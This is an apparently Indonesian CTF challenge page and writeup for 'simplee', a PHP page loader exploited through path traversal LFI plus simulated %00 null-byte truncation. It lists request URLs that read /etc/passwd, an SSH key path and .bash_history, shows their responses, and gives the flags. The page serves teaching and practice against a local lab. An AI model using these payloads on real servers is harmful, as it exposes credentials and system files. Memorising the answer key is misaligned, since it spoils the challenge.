# simplee
Difficulty: Easy
Author: aria

## Description
> Author: [aria](./user/aria)

Welcome to simplee. The webapp has a simple page loader — maybe too simple. Find the flag.

> Accessnya di host sendiri aja ya! (gw gak punya vps buat run docker :v)

```bash
docker pull ariafatah/simplee
docker run -p 8000:80 ariafatah/simplee
```

setelah itu akses di http://localhost:8000

#####
> ⚠️ Perhatian: challenge simplee saat ini tidak dapat diselesaikan karena website challenge sudah tidak tersedia / dihapus. Peserta yang sudah mendapatkan flag tetap akan diberi poin. Mohon maaf atas ketidaknyamanan.

## hint
#### hint1:
Perhatikan bagaimana aplikasi mengubah nama halaman. Coba kirimkan karakter yang biasanya “mengakhiri” string saat diproses oleh bahasa lain.

#### hint2:
Kalau file utama terlihat seperti “decoy”, mungkin ada jejak yang ditinggalkan oleh proses lain — coba cari file yang menyimpan rekaman/perintah atau informasi pengguna.

## writeup
Challenge ini memanfaatkan kombinasi dua hal: aplikasi PHP yang memasang ekstensi “.html” di akhir nama halaman (kecuali ketika peserta mengirim encoded null byte %00) dan kemampuan untuk melakukan path traversal (LFI). Dengan mengirimkan parameter page yang mengandung .. untuk menaiki direktori dan menambahkan %00 di URI mentah, kita bisa memaksa server meng-include file arbitrary (mis. /flag.txt, /etc/passwd, atau file di home user). Selain itu, jejak history di /home/aria/.bash_history berisi perintah yang pernah menulis flag asli ke /flag.txt, sehingga kita bisa mengambil flag asli dari sana.

- Local File Inclusion (LFI) — aplikasi meng-include file berdasarkan parameter page tanpa allowlist / canonicalization, sehingga path traversal ../../.. bisa membaca file di luar direktori web.
- Null-byte simulation — server mengecek literal %00 di REQUEST_URI dan apabila ada, server memotong parameter page pada posisi %00 dan tidak menambahkan .html. Itu mensimulasikan behaviour nul-byte truncation di C yang memungkinkan mem-bypass penambahan .html.
- Informasi yang bocor / jejak — ada file seperti /home/aria/.bash_history yang menyimpan perintah yang berisi flag asli; ini berguna untuk peserta agar mendapatkan flag yang sempat tertulis tapi kemudian tertimpa oleh decoy.

Reproduksi langkah demi langkah (dengan contoh yang kamu berikan)
### 1. Mulai di homepage
```http://192.168.1.11:8001/```
Tampilan: Welcome — This is the homepage. Try to find hidden pages.

### 2. Baca robots.txt (hint)
```http://192.168.1.11:8001/robots.txt```
Isi:
```bash
User-agent: *
Disallow: /?page=about
```

> Ini memberi tahu ada halaman about yang mungkin disembunyikan.

### 3. Normal include halaman about
```http://192.168.1.11:8001/?page=about```
Server meng-include pages/about.html (normal).

#### 4. Temukan behaviour null-byte (simulasi)
Kirim request dengan %00 pada URI:
```http://192.168.1.11:8001/?page=about%00```

> Server mencoba include pages/about (tanpa .html) dan gagal — berarti server memang memotong pada %00 dan tidak menambahkan .html. Ini menandakan kita bisa mengirim path traversal dan %00 untuk include file yang bukan berakhiran .html.

### 5. Baca /flag.txt via LFI + null-byte
Coba traversal menuju /flag.txt lalu tambahkan %00:
```http://192.168.1.11:8001/?page=../../../../flag.txt%00```
Response:
```bash
FGTE{ini_decoy_bang_coba_cari_lagi}
```

Ini menunjukkan /flag.txt saat itu berisi decoy flag.

### 6. Baca /etc/passwd via LFI + null-byte
```http://192.168.1.11:8001/?page=../../../../etc/passwd%00```
Response menyertakan baris:
```aria:x:1001:1001:Ada yang aneh di user ini:/home/aria:/bin/bash```

> Menunjukkan user aria ada — hint bahwa ada file di /home/aria yang layak diperiksa.

7. Baca file di home aria
Coba baca file yang tampak berguna:
```http://192.168.1.11:8001/?page=../../../../home/aria/flag.txt%00```

(hasil kosong / tidak berguna)

Baca private-key-decoy:
```http://192.168.1.11:8001/?page=../../../../home/aria/.ssh/id_rsa%00```
Response:
```FGTE{hampir_nemu_bang}```

(itu decoy lain)

8. Baca .bash_history untuk jejak
```http://192.168.1.11:8001/?page=../../../../home/aria/.bash_history%00```

Isi .bash_history:
```bash
echo FGTE{null_byte_html_lfi_working} > /flag.txt
echo FGTE{ini_decoy_bang_coba_cari_lagi} > /flag.txt
echo FGTE{hampir_nemu_bang} > /home/aria/flag.txt
echo FGTE{hampir_nemu_bang} > /home/aria/.ssh/id_rsa
```

Dari baris pertama terlihat bahwa flag asli sempat ditulis ke /flag.txt sebagai FGTE{null_byte_html_lfi_working} sebelum akhirnya ditimpa (baris kedua). Oleh karena itu, flag asli diketahui dari history.

<!-- ### -----
null byte injection, dan LFI (Local File Inclusion)

http://192.168.1.11:8001/
Welcome
This is the homepage. Try to find hidden pages.

http://192.168.1.11:8001/robots.txt
User-agent: *
Disallow: /?page=about
# Hint untuk CTF players â€” bots jangan index secret (intended)

http://192.168.1.11:8001/?page=about -> pages/about.html
About
Nothing interesting here.


http://192.168.1.11:8001/?page=about%00 -> pages/about
Page not found
Trying to include: /var/www/html/pages/about

http://192.168.1.11:8001/?page=../../../../flag.txt%00 -> /flag.txt
FGTE{ini_decoy_bang_coba_cari_lagi}

http://192.168.1.11:8001/?page=../../../../etc/passwd%00
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin aria:x:1001:1001:Ada yang aneh di user ini:/home/aria:/bin/bash

http://192.168.1.11:8001/?page=../../../../home/aria/flag.txt%00
http://192.168.1.11:8001/?page=../../../../home/aria/.ssh/id_rsa%00
FGTE{hampir_nemu_bang}

http://192.168.1.11:8001/?page=../../../../home/aria/.bash_history%00
echo FGTE{null_byte_html_lfi_working} > /flag.txt echo FGTE{ini_decoy_bang_coba_cari_lagi} > /flag.txt echo FGTE{hampir_nemu_bang} > /home/aria/flag.txt echo FGTE{hampir_nemu_bang} > /home/aria/.ssh/id_rsa
### ----- -->

## flag
```bash
FGTE{null_byte_html_lfi_working}
FGTE{../../../../home/aria/.bash_history%00}
```
